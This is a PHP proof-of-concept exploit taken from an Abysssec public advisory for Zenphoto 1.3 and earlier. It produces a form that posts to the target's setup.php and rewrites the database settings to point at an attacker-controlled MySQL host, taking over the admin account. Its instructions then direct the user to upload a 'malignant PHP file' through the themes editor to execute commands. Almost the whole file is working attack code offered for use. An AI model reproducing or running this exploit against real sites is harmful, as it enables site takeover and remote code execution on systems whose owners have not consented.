<?php
/*

  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub-26-zenphoto-config-update-and-command-execute-vulnerability/

Abysssec Inc Public Advisory
 
 
  Title            :  Zenphoto Config Update and Command Execute Vulnerability
  Affected Version :  Zenphoto <= 1.3
  Discovery        :  www.abysssec.com
  Vendor           :  http://www.zenphoto.org
 
*/


$path = "http://www.site.com/zenphoto" ."/" . "zp-core/setup.php";
$new_mysql_user = "abysssec";
$new_mysql_pass = "absssec";
$new_mysql_host = "abysssec.com";
$new_mysql_database = "abysssec_database";
$new_mysql_prefix = "zp_";
echo "<html><head></head>
<style>
body {font-family:tahoma;font-size:14px}
</style>

<body>";
echo "Zen Photo Image Gallery 1.3 Reset admin Password <br>
	By : Abysssec @ Inc <br>www.Abysssec.com<hr>
	<form method='POST' action='$path' >
	<input type=hidden name='mysql' value='yes'>
	<input type=hidden name='mysql_user' value='$new_mysql_user'>
	<input type=hidden name='mysql_pass' value='$new_mysql_pass'>
	<input type=hidden name='mysql_host' value='$new_mysql_host'>
	<input type=hidden name='mysql_database' value='$new_mysql_database'>
	<input type=hidden name='mysql_prefix' value='$new_mysql_prefix'>
	After click on below , if target will can connect to your Mysql_Host :<br>
	You Must view 'GO !' Messege ...<br>
	Click on & wait ....
	<br> Then , You need to set your admin user and password.<br><hr>
	Upload file:<br>
	you can Edit themes From themes Tab and Upload your malignant PHP file.<br>
	<input type=submit value='Send Your Setting '>
	</form>
	";
echo "</body></html>";
?>